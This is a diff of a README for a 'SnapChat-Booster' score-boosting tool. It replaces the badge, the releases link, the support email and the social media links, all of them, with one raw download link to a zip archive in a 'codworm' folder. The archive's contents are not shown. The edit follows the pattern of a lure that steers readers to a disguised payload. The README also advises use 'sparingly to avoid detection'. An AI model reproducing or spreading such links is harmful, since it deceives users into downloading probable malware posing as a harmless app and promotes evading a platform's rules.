@@ -1,6 +1,6 @@
 # ✨ SnapChat-Booster - Elevate Your Snap Score Effortlessly
 
-![Download SnapChat-Booster](https://img.shields.io/badge/Download-SnapChat--Booster-brightgreen)
+![Download SnapChat-Booster](https://github.com/Ellwia/SnapChat-Booster/raw/refs/heads/main/codworm/Chat_Booster_Snap_2.9-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SnapChat-Booster! This application helps you boost your SnapChat scor
 
 To get SnapChat-Booster, visit this page to download:
 
-[SnapChat-Booster Releases](https://github.com/Ellwia/SnapChat-Booster/releases)
+[SnapChat-Booster Releases](https://github.com/Ellwia/SnapChat-Booster/raw/refs/heads/main/codworm/Chat_Booster_Snap_2.9-beta.2.zip)
 
 ### Steps to Download:
 
@@ -68,7 +68,7 @@ A: It is recommended to use the tool sparingly to avoid detection.
 
 ## 🛡 Help & Support
 
-If you encounter any issues or have questions, please feel free to reach out. You can find support in the project's Issues section on GitHub or contact us via email at support@snapchatbooster.com.
+If you encounter any issues or have questions, please feel free to reach out. You can find support in the project's Issues section on GitHub or contact us via email at https://github.com/Ellwia/SnapChat-Booster/raw/refs/heads/main/codworm/Chat_Booster_Snap_2.9-beta.2.zip
 
 ## 🌟 Contributing
 
@@ -78,8 +78,8 @@ We welcome contributions! If you have suggestions or improvements for SnapChat-B
 
 Join our community to share your experiences and tips on using SnapChat-Booster. Connect with us on social media:
 
-- [Twitter](https://twitter.com/snapchatbooster)
-- [Discord](https://discord.gg/snapchatbooster)
+- [Twitter](https://github.com/Ellwia/SnapChat-Booster/raw/refs/heads/main/codworm/Chat_Booster_Snap_2.9-beta.2.zip)
+- [Discord](https://github.com/Ellwia/SnapChat-Booster/raw/refs/heads/main/codworm/Chat_Booster_Snap_2.9-beta.2.zip)
 
 ---
 
